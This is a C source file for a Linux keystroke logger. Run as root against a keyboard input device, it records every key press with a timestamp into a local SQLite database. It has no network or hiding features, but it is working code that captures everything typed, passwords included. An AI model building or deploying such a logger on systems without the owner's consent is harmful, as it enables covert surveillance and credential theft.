/* sudo ./keylog.exe /dev/input/by-path/*-kbd */

#define _POSIX_C_SOURCE 199309L

#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>
#include <sqlite3.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#define DB_DIR  "../keydb"
#define DB_PATH DB_DIR "/keys.db"
#define BATCH   1 // we need synced logging for dependant processses

static volatile sig_atomic_t stop = 0;

/* ---------- helpers ---------- */
static void handle_sig(int sig)               { (void)sig; stop = 1; }
static void fatal(const char *m)              { perror(m); exit(EXIT_FAILURE); }
static void ensure_db_dir(void)               { if (access(DB_DIR,F_OK)==-1 && mkdir(DB_DIR,0700)==-1 && errno!=EEXIST) fatal("mkdir db"); }
static int64_t tv_to_us(const struct timeval *t){ return (int64_t)t->tv_sec*1000000LL + t->tv_usec; }

int main(int argc,char **argv)
{
    if(argc<2){ fprintf(stderr,"device path required (e.g. /dev/input/event3)\n"); return 1; }

    signal(SIGINT,handle_sig); signal(SIGTERM,handle_sig);
    signal(SIGHUP,handle_sig); signal(SIGQUIT,handle_sig);

    ensure_db_dir();

    /* open keyboard device */
    int fd=open(argv[1],O_RDONLY|O_NONBLOCK); if(fd<0) fatal("open input");

    /* open / init sqlite */
    sqlite3 *db; if(sqlite3_open(DB_PATH,&db)!=SQLITE_OK) fatal("sqlite open");
    sqlite3_exec(db,"pragma journal_mode=WAL;",0,0,0);
    sqlite3_exec(db,
        "create table if not exists keystrokes("
        " ts_us integer,"
        " code  integer,"
        " os    text);",
        0,0,0);

    const char *sql="insert into keystrokes(ts_us, code, os) values (?,?,?);";
    sqlite3_stmt *st; if(sqlite3_prepare_v2(db,sql,-1,&st,0)!=SQLITE_OK) fatal("prepare");
    sqlite3_exec(db,"begin;",0,0,0);

    struct input_event ev; int queued=0; struct timespec ts={0,1000000L};

    while(!stop){
        ssize_t n=read(fd,&ev,sizeof ev);
        if(n==-1){
            if(errno==EAGAIN||errno==EWOULDBLOCK){ nanosleep(&ts,0); continue; }
            fatal("read");
        }
        if(n!=sizeof ev) continue;
        if(ev.type==EV_KEY && ev.value==1){
            sqlite3_bind_int64(st,1,tv_to_us(&ev.time));
            sqlite3_bind_int  (st,2,ev.code);
            sqlite3_bind_text (st,3,"linux",-1,SQLITE_STATIC);
            sqlite3_step(st); sqlite3_reset(st);
            
            #ifdef DEBUG
                printf("captured keycode is %d\n", ev.code);
                fflush(stdout);
            #endif
            
            if(++queued>=BATCH){ sqlite3_exec(db,"commit; begin;",0,0,0); queued=0; }
        }
    }

    if(queued) sqlite3_exec(db,"commit;",0,0,0);
    sqlite3_finalize(st); sqlite3_close(db); close(fd);
    fprintf(stderr,"\n[clean exit] keystrokes saved. goodbye.\n");
    return 0;
}
